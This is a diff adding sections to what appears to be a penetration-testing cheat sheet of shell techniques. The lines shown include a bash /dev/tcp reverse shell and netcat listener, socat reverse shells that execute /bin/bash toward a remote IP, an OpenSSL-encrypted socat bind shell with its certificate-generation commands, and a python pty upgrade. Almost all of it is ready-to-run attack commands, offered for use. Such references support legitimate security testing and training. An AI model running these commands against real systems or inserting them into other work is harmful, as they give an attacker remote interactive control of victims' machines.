@@ -107,6 +107,36 @@ bash -i >& /dev/tcp/10.9.6.147/4242 0>&1
 nc -lvnp 4242
 ```
 
+### Socat Reverse Shells
+
+```bash
+socat -d -d TCP4-LISTEN:443 STDOUT
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+```
+
+### Socat Encrypted Bind Shells
+
+**openssl**
+
+* req: initiate a new certificate signing request
+* \-newkey: generate a new private key
+* rsa:2048: use RSA encryption with a 2,048-bit key length.
+* \-nodes: store the private key without passphrase protection
+* \-keyout: save the key to a file
+* \-x509: output a self-signed certificate instead of a certificate request
+* \-days: set validity period in days
+* \-out: save the certificate to a file
+
+```bash
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+socat - OPENSSL:10.11.0.4:443,verify=0
+```
+
+\
+
+
 ### Get a pseudo terminal over netcat reverse shell
 
 <pre class="language-bash"><code class="lang-bash">python -c 'import pty;pty.spawn("/bin/bash")' # or
